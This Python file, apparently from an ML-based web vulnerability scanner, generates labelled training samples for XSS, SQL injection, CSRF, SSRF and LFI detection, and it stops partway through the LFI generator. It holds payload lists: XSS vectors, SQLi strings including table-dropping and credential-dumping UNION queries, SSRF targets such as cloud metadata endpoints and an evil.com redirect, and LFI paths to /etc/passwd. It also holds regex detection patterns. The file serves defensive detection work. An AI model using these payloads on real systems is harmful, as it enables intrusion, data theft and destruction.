#!/usr/bin/env python3
import os
import json
import random
import string
import traceback
import html as html_module
from app.config import ML_DEBUG
from bs4 import BeautifulSoup
import re
import sys
from urllib.parse import urlparse, parse_qs # Added for SQLi features

def generate_random_string(length=10):
    """Generate a random string of given length"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_xss_samples(num_samples=100):
    """Generate XSS training samples with diverse payloads and contexts"""
    samples = []

    # Expanded XSS payloads (examples, can be much larger)
    # Sources: OWASP XSS Filter Evasion Cheat Sheet, PortSwigger XSS Cheat Sheet, etc.
    xss_payloads = [
        # Basic
        '<script>alert(1)</script>',
        '<ScRipT>alert(1)</sCRipT>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<a href="javascript:alert(1)">click me</a>',
        '<div onmouseover="alert(1)">hover me</div>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',

        # HTML context breaking
        '</title><script>alert(1)</script>',
        '</textarea><script>alert(1)</script>',
        '</noscript><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
        '</iframe><script>alert(1)</script>',

        # Attributes
        '<img src="x" onerror="alert(1)">',
        '<img src=javascript:alert(1)>',
        '<img src=`javascript:alert(1)`>',
        '<img src=\\"x\\" onerror=\\"alert(1)\\">', # Escaped quotes
        '<div style="background:url(javascript:alert(1))">',
        '<div style="width: expression(alert(1));">', # IE specific

        # Event Handlers (various tags)
        '<button onclick="alert(1)">Click</button>',
        '<details open ontoggle="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<input onblur="alert(1)" autofocus>',
        '<form onsubmit="alert(1); return false;"><input type=submit></form>',
        '<select onchange="alert(1)"><option>1</option></select>',
        '<textarea onkeyup="alert(1)"></textarea>',
        '<body onpageshow="alert(1)">', # Requires navigation

        # JavaScript href
        '<a href="JaVaScRiPt:alert(1)">click</a>',
        '<a href="\\tjavascript:alert(1)">click</a>', # Tab
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>', # HTML entities

        # Obfuscation & Encoding
        '<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" onload="alert(1)">', # data URI
        '<script src="data:text/javascript,alert(1)"></script>',
        '<script>eval(\'al\'+\'ert(1)\')</script>',
        '<script>window[\\\'al\\\'+\\\'ert\\\'](1)</script>',
        '<script>setTimeout(\'alert(1)\',0)</script>',
        '<script>constructor.constructor("alert(1)")()</script>',

        # DOM XSS specific (might need more context for features)
        '#"><img src=x onerror=alert(1)>', # Fragment-based
        '<script>document.write(location.hash.substring(1))</script>', # Example sink for fragment
        '<script>eval(location.hash.substring(1))</script>',

        # Polyglots
        '"><svg/onload=alert(1)//',
        'javascript:"/*`/*-->`<svg/onload=alert(1)>`*/',
        '-->\'"><img src=x onerror=alert(1)>'
    ]

    # Define injection contexts
    # {PAYLOAD} is where the XSS payload goes
    # {SAFE_TEXT} is for non-vulnerable, escaped text
    # {RANDOM_ID} for unique element IDs
    # {RANDOM_TEXT} for generic random text
    html_contexts = [
        # 1. Reflected in HTML body
        lambda p, s, r_id, r_txt: f"<html><head><title>Search</title></head><body><div>Search results for: {p}</div><p>{r_txt}</p></body></html>",
        # 2. In HTML attribute (unquoted)
        lambda p, s, r_id, r_txt: f"<html><body><img src=x alt={p}><p>{r_txt}</p></body></html>",
        # 3. In HTML attribute (single-quoted)
        lambda p, s, r_id, r_txt: f"<html><body><a href='http://example.com?param={p}' title='{r_txt}'>Link</a></body></html>",
        # 4. In HTML attribute (double-quoted)
        lambda p, s, r_id, r_txt: f'<html><body><input type="text" name="query" value="{p}" id="{r_id}"></body></html>',
        # 5. Inside a <script> tag (string context)
        lambda p, s, r_id, r_txt: f"<html><head><script>var userInput = \"{p}\"; console.log(userInput);</script></head><body>{r_txt}</body></html>",
        # 6. Inside a <textarea>
        lambda p, s, r_id, r_txt: f"<html><body><textarea id='{r_id}'>{p}</textarea><p>{r_txt}</p></body></html>",
        # 7. Inside <title>
        lambda p, s, r_id, r_txt: f"<html><head><title>{p}</title></head><body>{r_txt}</body></html>",
        # 8. Inside an HTML comment (misconfiguration)
        lambda p, s, r_id, r_txt: f"<html><body><!-- User comment: {p} --><div>{r_txt}</div></body></html>",
        # 9. JavaScript eval-like sink
        lambda p, s, r_id, r_txt: f"<html><script>setTimeout(\"{p}\"); console.log('{r_txt}');</script></html>",
        # 10. JavaScript innerHTML sink
        lambda p, s, r_id, r_txt: f"<html><body><div id='{r_id}'></div><script>document.getElementById('{r_id}').innerHTML = \"{p}\";</script><p>{r_txt}</p></body></html>",
        # 11. JavaScript document.write sink
        lambda p, s, r_id, r_txt: f"<html><script>document.write(\"<div>{p}</div>\"); /* {r_txt} */</script></html>",
        # 12. CSS style attribute
        lambda p, s, r_id, r_txt: f"<html><div style=\"width:100px; {p}\" id=\"{r_id}\">{r_txt}</div></html>",
        # 13. Complex page with forms and scripts
        lambda p, s, r_id, r_txt: f"""
        <html><head><title>{r_txt} Page</title><meta charset="utf-8">
        <script src="jquery.js"></script><link rel="stylesheet" href="style.css"></head>
        <body><h1>{r_txt}</h1><form action="/submit"><input type="text" name="q" value="{p}" id="{r_id}">
        <input type="submit" value="Search"></form>
        <div id="results_{r_id}"></div>
        <script>
            function display(val) {{ document.getElementById('results_{r_id}').innerText = 'Result: ' + val; }}
            var data = "{s if s else 'default_value'}"; // Safe string for non-vulnerable
            // Potentially vulnerable if p is used directly in a sink later
            console.log("User input: {p}");
        </script></body></html>"""
    ]

    def generate_sample_html(is_vulnerable):
        raw_payload_text = random.choice(xss_payloads) if is_vulnerable else ""
        # If vulnerable, p gets the raw payload. If not, p gets an escaped random string.
        # safe_text_for_payload_slot is used when we need a guaranteed safe string for other parts of the template.
        p_val = raw_payload_text if is_vulnerable else html_module.escape(generate_random_string(20))
        safe_text_for_template = html_module.escape(generate_random_string(20))
        
        random_id = "el_" + generate_random_string(5)
        random_text_content = generate_random_string(30)
        
        chosen_context_func = random.choice(html_contexts)
        
        html_content = chosen_context_func(p_val, safe_text_for_template, random_id, random_text_content)
        
        # The URL might also contain the raw payload for some types of reflection
        # For consistency in URL generation, we use the raw payload if vulnerable, or the p_val (escaped random) if not.
        url_param_content = raw_payload_text if is_vulnerable else p_val 
        url = f"http://example.com/page?param={html_module.escape(url_param_content)}" # Always escape URL param for safety in this example URL
        
        return html_content, url, raw_payload_text # Return raw_payload_text

    # Helper function for advanced XSS feature extraction
    def extract_xss_features(html_string, soup, raw_payload_text):
        features = [0] * 40
        features[0] = len(html_string)
        features[1] = len(re.findall(r'<input', html_string, re.IGNORECASE))
        features[2] = len(re.findall(r'<form', html_string, re.IGNORECASE))
        features[5] = len(soup.find_all('iframe'))
        features[6] = len(soup.find_all('a', href=True))
        features[7] = len(soup.find_all('meta'))
        features[8] = len(soup.find_all('link'))

        event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout', 'onkeyup', 'onkeydown', 'onsubmit', 'onchange', 'onfocus']
        for i, handler in enumerate(event_handlers):
            features[10 + i] = len(re.findall(rf'{handler}', html_string, re.IGNORECASE))

        # Corrected js_patterns list using regular Python strings with explicit escapes
        js_patterns = [
            'eval[.(]',                    # Regex: eval[.(]
            'setTimeout[.(]',              # Regex: setTimeout[.(]
            'setInterval[.(]',             # Regex: setInterval[.(]
            'document[.]write[.(]',         # Regex: document[.]write[.(]
            '\\.innerHTML',                # Python string: \\.innerHTML -> Regex: \.innerHTML
            '\\.outerHTML',                # Python string: \\.outerHTML -> Regex: \.outerHTML
            '\\.insertAdjacentHTML',       # Python string: \\.insertAdjacentHTML -> Regex: \.insertAdjacentHTML
            '\\.execScript',               # Python string: \\.execScript -> Regex: \.execScript
            'new\\s+Function',             # Python string: new\\s+Function -> Regex: new\\s+Function
            r'window\x5b'                   # Raw string: r'window\x5b' -> Regex: window[
        ]
        for i, pattern in enumerate(js_patterns):
            try:
                features[20 + i] = len(re.findall(pattern, html_string, re.IGNORECASE))
            except re.error as e:
                # This will print if a specific pattern in js_patterns fails to compile
                # Useful if the main script error is somehow masking which pattern is the true culprit
                print(f"[ERROR] regex compilation/execution failed for pattern: '{pattern}'. Error: {e}", file=sys.stderr)
                features[20 + i] = 0 # Assign a default value or handle error appropriately

        dom_patterns = [
            r'document\\.createElement', r'document\\.appendChild', r'document\\.replaceChild',
            r'document\\.getElementById', r'document\\.querySelector', r'\\.setAttribute',
            r'\\.getAttribute', r'\\.removeAttribute', r'\\.dataset', r'\\.style'
        ]
        for i, pattern in enumerate(dom_patterns):
            features[30 + i] = len(re.findall(pattern, html_string, re.IGNORECASE))

        dangerous_js_sinks = ['eval(', 'document.write(', '.innerHTML', '.outerHTML', '.insertAdjacentHTML', 'setTimeout(', 'setInterval(', 'alert(']
        is_vulnerable_sample = bool(raw_payload_text)

        score_js_uri = 0
        for tag in soup.find_all(['a', 'iframe', 'img', 'form', 'object', 'embed', 'script']):
            for attr_name in ['href', 'src', 'action', 'data']:
                attr_value = tag.get(attr_name, '').lower()
                if attr_value.startswith('javascript:'):
                    score_js_uri += 1
                    if is_vulnerable_sample and raw_payload_text.lower() in attr_value:
                        score_js_uri += 2
                    for sink in dangerous_js_sinks:
                        if sink in attr_value:
                            score_js_uri += 1
        features[3] = score_js_uri

        score_script = 0
        for script_tag in soup.find_all('script'):
            script_content = script_tag.string if script_tag.string else ''
            script_src = script_tag.get('src', '')
            if is_vulnerable_sample and raw_payload_text.lower() in script_content.lower():
                score_script += 2
            for sink in dangerous_js_sinks:
                if sink.lower() in script_content.lower():
                    score_script += 1
            if script_src:
                script_src_lower = script_src.lower()
                if script_src_lower.startswith('javascript:') or script_src_lower.startswith('data:'):
                    score_script += 1
                    if is_vulnerable_sample and raw_payload_text.lower() in script_src_lower:
                        score_script += 2
                    for sink in dangerous_js_sinks:
                        if sink.lower() in script_src_lower:
                            score_script +=1
        features[4] = score_script
        
        score_event_handler = 0
        for tag in soup.find_all(True):
            for attr_name, attr_value in tag.attrs.items():
                if attr_name.lower().startswith('on'):
                    score_event_handler += 0.5
                    attr_value_lower = attr_value.lower()
                    if is_vulnerable_sample and raw_payload_text.lower() in attr_value_lower:
                        score_event_handler += 2
                    for sink in dangerous_js_sinks:
                        if sink.lower() in attr_value_lower:
                            score_event_handler += 1
        features[9] = int(score_event_handler)

        return features

    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        html, url, raw_payload = generate_sample_html(is_vulnerable=True)
        soup = BeautifulSoup(html, 'html.parser')
        features = extract_xss_features(html, soup, raw_payload)
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': True
        })
    
    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        html, url, raw_payload = generate_sample_html(is_vulnerable=False)
        soup = BeautifulSoup(html, 'html.parser')
        features = extract_xss_features(html, soup, raw_payload)
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': False
        })
    
    return samples

# Helper function for advanced SQLi feature extraction
def extract_sqli_features(url, html_string, soup, raw_sqli_payload):
    features = [0] * 42  # Initialize for 42 features

    # Basic HTML/URL properties
    features[0] = len(html_string)
    features[1] = len(url)

    # URL Analysis
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    features[2] = int(';' in url)  # url_has_semicolon
    features[3] = int(re.search(r'%27|%23|%2F\\*', url, re.IGNORECASE) is not None)  # url_has_encoded_comment_or_quote (%2F* for /*)
    features[4] = int(re.search(r'(--|#|/\*)', url) is not None)  # url_has_sql_comment
    features[5] = int(re.search(r'(sleep|benchmark|pg_sleep|waitfor\\s+delay)', url, re.IGNORECASE) is not None)  # url_has_time_based_keyword
    features[6] = int(re.search(r'(and\\s+\\d+=\\d+|or\\s+\\d+=\\d+|=)', url, re.IGNORECASE) is not None)  # url_has_boolean_logic (added =)
    features[7] = int("'" in url or '"' in url)  # url_has_quote
    found_concat = re.search(r'concat\x28', url, re.IGNORECASE)
    found_concat_ws = re.search(r'concat_ws\x28', url, re.IGNORECASE)
    found_group_concat = re.search(r'group_concat\x28', url, re.IGNORECASE)
    features[8] = int(bool(found_concat or found_concat_ws or found_group_concat))
    features[9] = int(bool(re.search(r'information_schema', url, re.I)))  # url_has_info_schema
    features[10] = int(bool(re.search(r'(sys\\.tables|sys\\.objects|all_tables|user_tables)', url, re.I)))  # url_has_db_tables_keyword
    features[11] = int(bool(re.search(r'(case\\s+when|decode\\())', url, re.I)))  # url_has_control_flow_keyword

    # SQL Keywords in URL
    sql_keywords_url = [
        r'select\\b', r'union\\b', r'insert\\b', r'update\\b', r'delete\\b',
        r'order\\s+by\\b', r'group\\s+by\\b', r'having\\b', r'limit\\b'
    ]
    for i, keyword_pattern in enumerate(sql_keywords_url):
        features[12 + i] = int(bool(re.search(keyword_pattern, url, re.IGNORECASE)))
    # features[12] = url_has_keyword_select
    # features[13] = url_has_keyword_union
    # ...
    # features[20] = url_has_keyword_limit

    # SQL Keywords in HTML
    features[21] = int(bool(re.search(r'\\bselect\\b', html_string, re.I))) # html_has_keyword_select
    features[22] = int(bool(re.search(r'\\bunion\\b', html_string, re.I)))  # html_has_keyword_union

    # Error Messages in HTML
    error_pattern = r'(sql\\s+syntax|unknown\\s+column|unclosed\\s+quotation|unterminated\\s+string|ora-\\d+|psql:|syntax\\s+error\\s+at\\s+or\\s+near|Microsoft OLE DB Provider|MariaDB server version for the right syntax|Warning: include|failed to open stream)'
    features[23] = int(bool(re.search(error_pattern, html_string, re.IGNORECASE))) # html_has_common_sql_error (added LFI like errors for broader check)

    # Encoding in URL
    features[24] = int(bool(re.search(r'(%20|\\+)', url)))  # url_has_space_encoding
    features[25] = int(bool(re.search(r'%[0-9a-fA-F]{2}', url))) # url_has_hex_encoding (general)

    # Parameter Analysis
    features[26] = len(query_params) # num_url_params
    suspicious_param_names = ['id', 'item', 'prod', 'user', 'name', 'cat', 'category', 'search', 'query', 'q', 'p', 'file', 'page', 'dir', 'view', 'document', 'param', 'val']
    features[27] = int(any(p_name.lower() in suspicious_param_names for p_name in query_params.keys())) # url_param_name_suspicious
    
    param_value_long = False
    param_value_has_payload_chars = False
    if query_params:
        for values_list in query_params.values():
            for val_str in values_list:
                if len(val_str) > 50: # Arbitrary length for "long"
                    param_value_long = True
                if re.search(r"['\"()#;=]|--|/\\*", val_str): # Common SQLi characters
                    param_value_has_payload_chars = True
                if param_value_long and param_value_has_payload_chars: break
            if param_value_long and param_value_has_payload_chars: break
    features[28] = int(param_value_long) # url_param_value_long
    features[29] = int(param_value_has_payload_chars) # url_param_value_has_payload_chars

    # Payload presence in HTML contexts (only if raw_sqli_payload is provided)
    if raw_sqli_payload:
        payload_lower = raw_sqli_payload.lower()
        features[30] = int(bool(soup.find('input', value=lambda v: v and payload_lower in v.lower())))
        features[31] = int(bool(any(payload_lower in (s.string.lower() if s.string else '') for s in soup.find_all('script'))))
        features[32] = int(bool(soup.find('a', href=lambda h: h and payload_lower in h.lower())))
        features[33] = int(bool(any(payload_lower in (t.get_text().lower() if t.get_text() else '') for t in soup.find_all(['div', 'p', 'span', 'td', 'li', 'h1', 'h2', 'h3', 'pre', 'code']))))
    # features[30] = payload_in_form_input_value
    # features[31] = payload_in_script_tag_content
    # features[32] = payload_in_href
    # features[33] = payload_in_generic_tag_content

    # Counts
    features[34] = url.count("'")  # count_single_quotes_url
    features[35] = url.count('"')  # count_double_quotes_url
    features[36] = len(re.findall(r'(--|#|/\*)', url)) # count_sql_comments_url
    features[37] = url.count('(') # count_opening_parens_url
    features[38] = url.count(')') # count_closing_parens_url
    
    # General HTML flags
    features[39] = int(bool(re.search(r'waf|firewall|blocked|captcha|forbidden|access denied', html_string, re.I))) # html_has_waf_or_permission_message
    features[40] = int(bool(re.search(r'json.*error', html_string, re.I))) # html_has_json_error
    features[41] = int(bool(re.search(r'(<form|<input|<textarea)', html_string, re.I))) # html_has_form_elements
    
    return features

def generate_sqli_samples(num_samples=100):
    """Generate SQL injection training samples with advanced features"""
    samples = []
    sqli_payloads = [
        "' OR '1'='1", "1' OR '1'='1' --", "' UNION SELECT username,password FROM users --", "admin' --", "' OR 1=1; DROP TABLE users --",
        "1; SELECT * FROM information_schema.tables --", "' OR '1'='1' LIMIT 1 --", "1' ORDER BY 1--", "1' GROUP BY 1--", "' HAVING 1=1 --",
        # Encoded
        "%27%20OR%20%271%27%3D%271", "%27%20AND%20SLEEP%285%29--", "%27%20UNION%20SELECT%20NULL--",
        # Stack queries
        "1; SELECT SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
        # NoSQLi (though features are mostly relational SQL focused)
        '{"$gt": ""}', '{"$ne": null}', '{"$where": "sleep(5000)"}',
        # WAF bypass attempts
        "' /*!50000OR*/ '1'='1", "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,2,3--",
        # Real bug bounty/CTF like
        "' OR 1=1-- -", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1;--", "' OR 1=1;#", "' OR 1=1;/*",
        " UNION SELECT @@VERSION, SLEEP(5), NULL-- ",
        " AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        " IF(1=1,SLEEP(5),0)"
    ]
    
    common_param_names_for_payload = ["id", "user", "name", "search", "category", "file", "page", "dir", "view", "query", "p", "prod"]

    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        raw_payload = random.choice(sqli_payloads)
        param_name = random.choice(common_param_names_for_payload)
        
        # Construct URL - payload might be URL encoded sometimes
        url_encoded_payload = html_module.escape(raw_payload) # Basic escaping for URL context
        if random.random() < 0.3: # Sometimes use raw, sometimes encoded for variety
            url_param_val = raw_payload
        else:
            url_param_val = url_encoded_payload

        url = f"http://example.com/search?{param_name}={url_param_val}&timestamp={generate_random_string(5)}"
        
        # HTML reflects payload in various ways
        html_content = f"""
        <html><head><title>Search Results for {html_module.escape(raw_payload[:20])}</title></head><body>
        <h1>Query: {html_module.escape(raw_payload)}</h1>
        <div class='error'>MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '{html_module.escape(raw_payload[:30])}' at line 1</div>
        <div class='debug_query'>SELECT * FROM products WHERE {param_name} = '{raw_payload}' AND published = 1;</div>
        <form action='/search'>
            <input type='text' name='{param_name}' value='{html_module.escape(raw_payload)}'>
            <input type='submit' value='Search'>
        </form>
        <script>var userQuery = '{html_module.escape(raw_payload)}'; console.log(userQuery);</script>
        <a href='/search?{param_name}={url_encoded_payload}'>Vulnerable Link</a>
        <div class="user-data">User provided: <pre>{html_module.escape(raw_payload)}</pre></div>
        <!-- User Agent: sqlmap/1.5 -->
        <!-- Cookie: session_id=abc; user_pref={url_encoded_payload} -->
        </body></html>
        """
        soup = BeautifulSoup(html_content, 'html.parser')
        features = extract_sqli_features(url, html_content, soup, raw_payload)
        samples.append({'url': url, 'html': html_content, 'features': features, 'is_vulnerable': True})

    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        param_name = random.choice(common_param_names_for_payload)
        safe_value = generate_random_string(random.randint(5,15))
        url = f"http://example.com/search?{param_name}={safe_value}&timestamp={generate_random_string(5)}"
        html_content = f"""
        <html><head><title>Search Results for {safe_value}</title></head><body>
        <h1>Query: {safe_value}</h1>
        <div>Displaying results for term: {safe_value}</div>
        <form action='/search'>
            <input type='text' name='{param_name}' value='{safe_value}'>
            <input type='submit' value='Search'>
        </form>
        <script>var userQuery = '{safe_value}'; console.log(userQuery);</script>
        <a href='/search?{param_name}={safe_value}'>Safe Link</a>
        </body></html>
        """
        soup = BeautifulSoup(html_content, 'html.parser')
        features = extract_sqli_features(url, html_content, soup, "") # Pass empty string for raw_sqli_payload
        samples.append({'url': url, 'html': html_content, 'features': features, 'is_vulnerable': False})
    
    return samples

def generate_csrf_samples(num_samples=100):
    """Generate CSRF training samples"""
    samples = []
    
    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        url = f"http://example.com/account/settings"
        html = f"""
        <html>
        <head>
            <title>Account Settings</title>
            <link rel="stylesheet" href="style.css">
            <meta charset="utf-8">
        </head>
        <body>
            <h1>Account Settings</h1>
            <form action="/account/update" method="POST">
                <input type="text" name="email" value="user@example.com">
                <input type="password" name="password" placeholder="New password">
                <input type="submit" value="Update">
            </form>
            <script>
                function validateForm() {{
                    var email = document.getElementById('email').value;
                    var password = document.getElementById('password').value;
                    return email && password;
                }}
            </script>
        </body>
        </html>
        """
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        forms = soup.find_all('form')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            
            # CSRF tokens
            len(re.findall(r'csrf[_-]token', html, re.IGNORECASE)),
            len(re.findall(r'_token', html, re.IGNORECASE)),
            0,  # No X-CSRF-TOKEN header
            0,  # No X-XSRF-TOKEN header
            0,  # No CSRF meta tag
            
            # Form analysis
            len(forms),
            len([f for f in forms if f.get('method', '').lower() == 'post']),
            len([f for f in forms if not f.find('input', {'type': 'hidden'})]),
            len([f for f in forms if f.find('input', {'type': 'password'})]),
            len([f for f in forms if f.find('input', {'type': 'submit'})]),
            
            # Security headers
            0,  # No SameSite cookie
            0,  # No Secure cookie
            0,  # No HttpOnly cookie
            0,  # No X-Frame-Options header
            0,  # No Content-Security-Policy header
            
            # Authentication indicators
            len(re.findall(r'login|signin|register', html, re.IGNORECASE)),
            len(re.findall(r'password|passwd', html, re.IGNORECASE)),
            len(re.findall(r'auth|authentication', html, re.IGNORECASE)),
            len(re.findall(r'session|cookie', html, re.IGNORECASE)),
            len(re.findall(r'user|username|email', html, re.IGNORECASE))
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': True
        })
    
    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        url = f"http://example.com/account/settings"
        html = f"""
        <html>
        <head>
            <title>Account Settings</title>
            <link rel="stylesheet" href="style.css">
            <meta name="csrf-token" content="{generate_random_string(32)}">
            <meta charset="utf-8">
        </head>
        <body>
            <h1>Account Settings</h1>
            <form action="/account/update" method="POST">
                <input type="hidden" name="_csrf" value="{generate_random_string(32)}">
                <input type="text" name="email" value="user@example.com">
                <input type="password" name="password" placeholder="New password">
                <input type="submit" value="Update">
            </form>
            <script>
                function validateForm() {{
                    var email = document.getElementById('email').value;
                    var password = document.getElementById('password').value;
                    return email && password;
                }}
            </script>
        </body>
        </html>
        """
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        forms = soup.find_all('form')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            
            # CSRF tokens
            len(re.findall(r'csrf[_-]token', html, re.IGNORECASE)),
            len(re.findall(r'_token', html, re.IGNORECASE)),
            1,  # Has X-CSRF-TOKEN header
            1,  # Has X-XSRF-TOKEN header
            1,  # Has CSRF meta tag
            
            # Form analysis
            len(forms),
            len([f for f in forms if f.get('method', '').lower() == 'post']),
            len([f for f in forms if not f.find('input', {'type': 'hidden'})]),
            len([f for f in forms if f.find('input', {'type': 'password'})]),
            len([f for f in forms if f.find('input', {'type': 'submit'})]),
            
            # Security headers
            1,  # Has SameSite cookie
            1,  # Has Secure cookie
            1,  # Has HttpOnly cookie
            1,  # Has X-Frame-Options header
            1,  # Has Content-Security-Policy header
            
            # Authentication indicators
            len(re.findall(r'login|signin|register', html, re.IGNORECASE)),
            len(re.findall(r'password|passwd', html, re.IGNORECASE)),
            len(re.findall(r'auth|authentication', html, re.IGNORECASE)),
            len(re.findall(r'session|cookie', html, re.IGNORECASE)),
            len(re.findall(r'user|username|email', html, re.IGNORECASE))
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': False
        })
    
    return samples

def generate_ssrf_samples(num_samples=100):
    """Generate SSRF training samples (расширено)"""
    samples = []
    ssrf_payloads = [
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/", "http://100.100.100.200/latest/meta-data/", "http://metadata.azure.com/",
        # Localhost/loopback
        "http://localhost:8080/admin", "http://127.0.0.1/phpinfo.php", "file:///etc/passwd", "http://0.0.0.0:80/", "http://[::1]/",
        # Internal IPs
        "http://10.0.0.1/internal-api", "http://192.168.1.1/router-admin", "http://172.16.0.1/secret",
        # Obfuscated IPs
        "http://0x7f000001/", "http://2130706433/", "http://localhost.localdomain/",
        # Uncommon protocols
        "gopher://127.0.0.1:6379/_INFO", "dict://localhost:11211/", "ftp://internal-ftp/confidential/", "ldap://127.0.0.1/",
        # DNS rebinding
        "http://rebind.testdomain.com/", "http://dynamic.dns/",
        # SSRF chain
        "http://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/",
        # With @
        "http://127.0.0.1@evil.com/",
        # POST/JSON
        "http://api.internal/endpoint"
    ]
    ssrf_params = ["url", "path", "file", "dest", "redirect", "uri", "source", "callback", "next", "data", "continue", "domain", "host", "website", "feed", "to", "out", "image", "link", "proxy", "forward", "remote", "open", "load", "fetch", "resource"]
    protocols = ["gopher://", "dict://", "file://", "ftp://", "ldap://", "php://", "data://", "jar://", "zip://"]
    for _ in range(num_samples // 2):
        payload = random.choice(ssrf_payloads)
        param = random.choice(ssrf_params)
        proto = random.choice(protocols) if random.random() < 0.2 else ""
        url = f"http://example.com/proxy?{param}={proto}{payload}"
        html = f"""
        <html><head><title>Proxy Results</title></head><body>
        <div class='error'>Error fetching URL: Connection refused to {payload}</div>
        <div class='debug'>curl_exec() failed: Connection refused file_get_contents(): failed to open stream fsockopen(): unable to connect</div>
        <script>fetch('{payload}').then(r=>r.text()).catch(e=>console.error(e));</script>
        <meta name='redirect' content='{payload}'>
        <a href='{payload}'>link</a>
        <form action='/proxy'><input name='{param}' value='{payload}'></form>
        <header>X-Forwarded-For: 127.0.0.1</header>
        </body></html>
        """
        features = [
            int(any(p in url for p in ssrf_params)),
            url.count('&')+1 if '?' in url else 0,
            int('url=' in html.lower()),
            int('gopher://' in url.lower()),
            int('dict://' in url.lower()),
            int('smb://' in url.lower()),
            int('ldap://' in url.lower()),
            int('file://' in url.lower()),
            int('php://' in url.lower()),
            int(any(x in url.lower() for x in ['169.254.169.254','metadata.google.internal','metadata.azure.com','100.100.100.200'])),
            int(any(x in url.lower() for x in ['localhost','127.0.0.1','0.0.0.0','[::1]','localhost.localdomain'])),
            int(any(x in url for x in ['192.168.','10.','172.16.','172.17.','172.18.','172.19.','172.20.','172.21.','172.22.','172.23.','172.24.','172.25.','172.26.','172.27.','172.28.','172.29.','172.30.','172.31.'])),
            int('0x' in url.lower()),
            int(re.search(r'\d{8,10}', url) is not None),
            int('[' in url and ']' in url),
            int('@' in url),
            int('rebind' in url.lower() or 'dynamic.dns' in url.lower()),
            int('x-forwarded-for' in html.lower()),
            int('host:' in html.lower()),
            int('location:' in html.lower()),
            int(html.lower().count('redirect') > 1),
            int(any(x in html.lower() for x in ['connection refused','timeout','no route to host','invalid url','refused to connect'])),
            int(any(x in html.lower() for x in ['ami-id','instance-id','hostname','access-key'])),
            int(any(x in html.lower() for x in ['192.168.','10.','172.','localhost','127.0.0.1'])),
            int('location:' in html.lower()),
            0,
            len(html),
            html.lower().count('location:'),
            int('url=' in html.lower() and 'form' in html.lower()),
            int('url=' in html.lower() and 'script' in html.lower()),
            int('url=' in html.lower() and 'a href' in html.lower()),
            int('url=' in html.lower() and 'header' in html.lower()),
            int('url=' in html.lower() and 'cookie' in html.lower()),
        ]
        samples.append({'url': url, 'html': html, 'features': features, 'is_vulnerable': True})
    # Non-vulnerable
    for _ in range(num_samples // 2):
        url = f"http://example.com/proxy?url=https://api.example.com/v1/data/{random.randint(1,10000)}"
        html = f"<html><body><div>Fetched external API data.</div></body></html>"
        features = [0]*len(samples[0]['features'])
        samples.append({'url': url, 'html': html, 'features': features, 'is_vulnerable': False})
    return samples

def generate_lfi_samples(num_samples=100):
    """Generate LFI training samples"""
    samples = []
    
    # LFI payloads
    lfi_payloads = [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://input",
        "phar://archive.phar/file.txt",
        "zip://archive.zip#file.txt",
        "/proc/self/environ",
        "data://text/plain;base64,SGVsbG8="
    ]
    
    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        payload = random.choice(lfi_payloads)
        url = f"http://example.com/page.php?file={payload}"
        html = f"""
        <html>
        <head>
            <title>File Viewer</title>
            <link rel="stylesheet" href="style.css">
            <meta charset="utf-8">
        </head>
        <body>
            <h1>File Viewer</h1>
            <div class="error">
                Warning: include({payload}): failed to open stream: No such file or directory in /var/www/html/page.php on line 10
            </div>
            <div class="debug">
                include($file);
